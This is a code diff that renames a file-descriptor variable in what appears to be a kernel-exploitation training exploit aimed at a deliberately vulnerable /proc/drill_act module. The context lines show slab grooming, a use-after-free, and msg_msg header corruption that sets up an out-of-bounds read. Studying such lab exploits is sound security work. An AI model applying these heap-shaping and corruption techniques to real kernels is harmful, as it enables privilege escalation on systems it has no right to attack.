@@ -82,7 +82,7 @@ void run_sh(void)
 	}
 }
 
-int act(int fd, int code, int n, char *args)
+int act(int act_fd, int code, int n, char *args)
 {
 	char buf[DRILL_ACT_SIZE] = { 0 };
 	size_t len = 0;
@@ -96,7 +96,7 @@ int act(int fd, int code, int n, char *args)
 	len = strlen(buf) + 1; /* with null byte */
 	assert(len <= DRILL_ACT_SIZE);
 
-	bytes = write(fd, buf, len);
+	bytes = write(act_fd, buf, len);
 	if (bytes <= 0) {
 		perror("[-] write");
 		return EXIT_FAILURE;
@@ -187,7 +187,7 @@ int prepare_msg_msg(void)
 int main(void)
 {
 	int ret = EXIT_FAILURE;
-	int fd = -1;
+	int act_fd = -1;
 	long i = 0;
 	long current_n = 0;
 	long reserved_from_n = 0;
@@ -201,8 +201,8 @@ int main(void)
 	if (ret == EXIT_FAILURE)
 		goto end;
 
-	fd = open("/proc/drill_act", O_WRONLY);
-	if (fd < 0) {
+	act_fd = open("/proc/drill_act", O_WRONLY);
+	if (act_fd < 0) {
 		perror("[-] open drill_act");
 		goto end;
 	}
@@ -213,7 +213,7 @@ int main(void)
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
-		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
 		}
@@ -224,7 +224,7 @@ int main(void)
 
 	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
 	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
-		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
 		}
@@ -234,7 +234,7 @@ int main(void)
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
-		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
 		}
@@ -248,7 +248,7 @@ int main(void)
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
-		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
 		}
@@ -260,7 +260,7 @@ int main(void)
 	current_n--; /* point to the last allocated */
 	current_n--; /* don't free the last allocated to keep this active slab */
 	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
-		if (act(fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_FREE\n");
 			goto end;
 		}
@@ -271,7 +271,7 @@ int main(void)
 
 	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
 	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
-		if (act(fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
+		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_FREE\n");
 			goto end;
 		}
@@ -296,7 +296,7 @@ int main(void)
 	 *  - m_type in msg_msg is at the offset 16;
 	 *  - DRILL_ACT_SAVE_VAL with 0 as 2nd argument also starts at the offset 16.
 	 */
-	ret = act(fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(MSG_OOB_TYPE) " 0");
+	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(MSG_OOB_TYPE) " 0");
 	if (ret == EXIT_FAILURE)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
@@ -306,7 +306,7 @@ int main(void)
 	 *  - m_ts in msg_msg is at the offset 24;
 	 *  - DRILL_ACT_SAVE_VAL with 8 as 2nd argument also starts at the offset 24.
 	 */
-	ret = act(fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(MSG_OOB_SIZE) " 8");
+	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(MSG_OOB_SIZE) " 8");
 	if (ret == EXIT_FAILURE)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
@@ -360,11 +360,11 @@ end:
 	}
 	printf("  cleaned the message queue: received %ld normal messages\n", i);
 
-	if (fd >= 0) {
-		ret = close(fd);
+	if (act_fd >= 0) {
+		ret = close(act_fd);
 		if (ret != 0)
-			perror("[-] close fd");
-		printf("  closed the drill_act fd\n");
+			perror("[-] close act_fd");
+		printf("  closed the drill_act act_fd\n");
 	}
 
 	return ret;
